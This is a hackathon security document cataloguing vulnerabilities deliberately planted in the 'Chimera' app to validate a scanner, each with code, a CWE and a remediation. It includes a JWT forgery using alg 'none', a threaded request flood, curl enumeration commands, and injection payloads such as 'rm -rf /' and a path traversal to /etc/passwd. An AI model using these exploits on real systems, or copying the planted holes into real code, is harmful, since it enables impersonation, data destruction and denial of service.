# Security Test Cases & Known Vulnerabilities

This document describes intentional vulnerabilities in the Chimera codebase for **security testing and tool validation purposes only**.

**⚠️ WARNING**: These vulnerabilities are documented for hackathon security challenge testing. Do NOT use this code in production.

---

## 1. JWT Signature Verification Disabled (CWE-347)

**Severity**: CRITICAL  
**Location**: `backend/auth.py:14`  
**Vulnerability Type**: Authentication Bypass  

### Code:
```python
payload = jwt.decode(
    token,
    options={"verify_signature": False}  # ✗ No signature verification
)
```

### Exploit Example:
```python
import jwt

# Attacker can craft any token without a real secret
fake_payload = {"sub": "admin-user-123", "email": "admin@example.com"}
fake_token = jwt.encode(fake_payload, "", algorithm="none")

# Backend accepts this as valid authentication
# Attacker can impersonate any user by changing "sub" value
```

### Detection**: Aikido should flag missing JWT signature verification.

---

## 2. Plaintext Password Storage (CWE-256, CWE-327)

**Severity**: CRITICAL  
**Location**: `backend/models.py` - `CompromisedCredential` table  
**Vulnerability Type**: Sensitive Data Exposure, No Encryption at Rest  

### Code:
```python
class CompromisedCredential(Base):
    __tablename__ = 'compromised_credentials'
    id = Column(Integer, primary_key=True)
    email = Column(String, nullable=True)
    password = Column(String, nullable=True)  # ✗ Plaintext, no encryption
    metadata = Column(Text)  # ✗ No encryption
```

### Exploit:
```python
# Query database directly (if attacker gains DB access)
SELECT email, password FROM compromised_credentials;
# Returns rows like: | user@example.com | mysecretpassword123 |
```

### Detection**: Aikido detects plaintext sensitive data storage.

---

## 3. Unauthenticated Endpoint (CWE-306)

**Severity**: HIGH  
**Location**: `backend/app.py:45` - `/api/gosearch`  
**Vulnerability Type**: Missing Authentication  

### Code:
```python
@app.get("/api/gosearch")
async def gosearch_proxy(username: str):
    # ✗ NO authentication check - anyone can call this
    gosearch_url = os.getenv("GOSEARCH_URL", "http://gosearch:8081/search")
    # ... execute gosearch for any username
```

### Exploit:
```bash
# Attacker can enumerate all usernames without authentication
curl http://localhost:8000/api/gosearch?username=admin
curl http://localhost:8000/api/gosearch?username=user1
curl http://localhost:8000/api/gosearch?username=root
```

### Detection**: Aikido flags endpoints missing authentication/authorization.

---

## 4. No Rate Limiting (CWE-770)

**Severity**: MEDIUM  
**Location**: All endpoints in `backend/app.py`  
**Vulnerability Type**: Denial of Service (DoS)  

### Exploit:
```python
import requests
import threading

# Brute-force endpoint with no rate limiting
def spam_endpoint():
    for i in range(100000):
        requests.get("http://localhost:8000/api/gosearch?username=attacker")
        
threads = [threading.Thread(target=spam_endpoint) for _ in range(10)]
for t in threads:
    t.start()
# Server gets overwhelmed, legitimate users can't access it
```

### Detection**: Aikido flags absence of rate limiting / request throttling.

---

## 5. Broad CORS Permissions (CWE-1021)

**Severity**: MEDIUM  
**Location**: `backend/app.py:14-19`  
**Vulnerability Type**: CORS Misconfiguration  

### Code:
```python
app.add_middleware(
    CORSMiddleware,
    allow_origins=["http://localhost:3000", "http://localhost:3001"],
    allow_credentials=True,
    allow_methods=["*"],    # ✗ Allows all HTTP methods
    allow_headers=["*"],    # ✗ Allows all headers
)
```

### Risk:
- Allows any HTTP method (GET, POST, PUT, DELETE, PATCH, etc.)
- Allows any header, including custom auth headers
- Combined with credential=True, enables cross-origin requests with auth cookies

### Detection**: Aikido flags overly permissive CORS settings.

---

## 6. Hardcoded Secrets (CWE-798)

**Severity**: MEDIUM  
**Location**: `docker-compose.yml` (if secrets are in file)  
**Vulnerability Type**: Hardcoded Credentials / Secrets in Version Control  

### Example (vulnerable):
```yaml
# docker-compose.yml
environment:
  - CLERK_SECRET_KEY=sk_live_abc123def456  # ✗ Real secret in file!
  - GITHUB_CLIENT_SECRET=ghs_1234567890abcdef  # ✗ Exposed!
```

### Safe Alternative:
```yaml
# docker-compose.yml
environment:
  - CLERK_SECRET_KEY=${CLERK_SECRET_KEY}  # ✓ From .env (which is .gitignored)
```

### Detection**: Aikido scans for hardcoded API keys, passwords, tokens in code/configs.

---

## 7. Weak or Missing Input Validation (CWE-20)

**Severity**: MEDIUM  
**Location**: `backend/app.py` - `/api/search-accounts`  
**Vulnerability Type**: Input Validation Not Enforced  

### Code:
```python
@app.post("/api/search-accounts")
async def search_and_save_accounts(
    search_data: dict,
    ...
):
    username = search_data.get("username")
    
    if not username:
        raise HTTPException(status_code=400, detail="Username is required")
    # ✗ No validation of username format, length, or content
    # Could accept: "../../etc/passwd", "a" * 100000, special shell chars, etc.
```

### Exploit:
```python
# Attacker sends:
POST /api/search-accounts
{"username": "aaaaaa...aaaaaa"}  # 1 MB string → potential DoS

{"username": "'; DROP TABLE users; --"}  # Potential SQLi if misused elsewhere

{"username": "../../../etc/passwd"}  # Path traversal attempt
```

### Detection**: Aikido flags missing input validation / sanitization.

---

## 8. Command Injection via Subprocess (CWE-78)

**Severity**: HIGH  
**Location**: `gosearch/main.go` (if using unsafe shell invocation)  
**Vulnerability Type**: Command Injection  

### Unsafe Example (NOT in current code, but potential):
```python
# ✗ VULNERABLE PYTHON CODE (example)
import os
username = request.args.get('username')
os.system(f"gosearch -u {username}")  # Shell injection!
# Attacker input: "elonmusk; rm -rf /"
```

### Safe Code (Current implementation):
```go
// ✓ SAFE (uses argument array, not shell)
cmd := exec.CommandContext(ctx, path, "-u", username)
```

### Detection**: Aikido flags use of `os.system()`, `subprocess.shell=True`, etc.

---

## 9. No SQL Parameterization (CWE-89)

**Severity**: HIGH  
**Location**: Potential in any raw SQL queries  
**Vulnerability Type**: SQL Injection  

### Unsafe Example (NOT in current code):
```python
# ✗ VULNERABLE CODE (example - NOT in codebase)
query = f"SELECT * FROM users WHERE email = '{email}'"
db.execute(query)
```

### Safe Code (Current implementation uses ORM):
```python
# ✓ SAFE (uses SQLAlchemy ORM with parameterization)
user = db.query(User).filter_by(email=email).first()
```

### Detection**: Aikido flags raw SQL queries without parameterization.

---

## 10. Insecure Deserialization (CWE-502)

**Severity**: MEDIUM  
**Location**: Potential if `pickle` is used  
**Vulnerability Type**: Insecure Deserialization  

### Unsafe Example (NOT in current code):
```python
# ✗ VULNERABLE CODE (example - NOT used)
import pickle
data = pickle.loads(user_input)  # Arbitrary code execution!
```

### Safe Code (Current implementation):
```python
# ✓ SAFE (uses json.loads)
metadata = json.loads(account.account_metadata)
```

### Detection**: Aikido flags use of `pickle.loads()` on untrusted data.

---

## Test Cases for Aikido Scanning

### Test 1: JWT Token Forgery
```bash
# Generate unsigned JWT
python -c "
import jwt
token = jwt.encode({'sub':'admin','email':'admin@test.com'}, '', algorithm='none')
print(token)
"

# Use forged token
curl -H "Authorization: Bearer $TOKEN" http://localhost:8000/api/users/me
# Expected: Should fail in secure setup, but succeeds due to CWE-347
```

### Test 2: Database Enumeration (No Auth)
```bash
# Call unauthenticated endpoint
curl http://localhost:8000/api/gosearch?username=admin
curl http://localhost:8000/api/gosearch?username=root
curl http://localhost:8000/api/gosearch?username=test
# Expected: All succeed without authentication (CWE-306)
```

### Test 3: Plaintext Password Exposure
```bash
# Query the database (if you have access)
psql -U postgres -d chimera_db -c "SELECT email, password FROM compromised_credentials LIMIT 5;"
# Expected: Shows plaintext passwords (CWE-256)
```

### Test 4: DoS via Rate Limiting Absence
```bash
# Spam endpoint (simulate 1000 requests)
for i in {1..1000}; do
  curl http://localhost:8000/api/gosearch?username=user$i &
done
# Expected: Server processes all requests without throttling (CWE-770)
```

---

## Aikido Detection Expected Results

| Vulnerability | CWE | Expected Detection |
|---|---|---|
| Disabled JWT Verification | CWE-347 | ✓ CRITICAL |
| Plaintext Passwords | CWE-256, CWE-327 | ✓ HIGH |
| Missing Authentication | CWE-306 | ✓ HIGH |
| No Rate Limiting | CWE-770 | ✓ MEDIUM |
| Broad CORS | CWE-1021 | ✓ MEDIUM |
| Hardcoded Secrets | CWE-798 | ✓ MEDIUM |
| Weak Input Validation | CWE-20 | ✓ MEDIUM |
| Missing Encryption | CWE-327 | ✓ HIGH |

---

## Remediation Checklist

- [ ] Enable JWT signature verification with proper secret
- [ ] Hash/encrypt passwords before storage
- [ ] Add authentication to all sensitive endpoints
- [ ] Implement rate limiting (use `slowapi` or similar)
- [ ] Restrict CORS to specific allowed origins/methods
- [ ] Move secrets to `.env` (not in version control)
- [ ] Validate and sanitize all user inputs
- [ ] Use parameterized queries (avoid raw SQL)
- [ ] Encrypt sensitive database columns
- [ ] Add input length limits and type validation

---

**For Hackathon**: This file documents vulnerabilities for **security tool testing only**. In production, all these issues should be fixed.
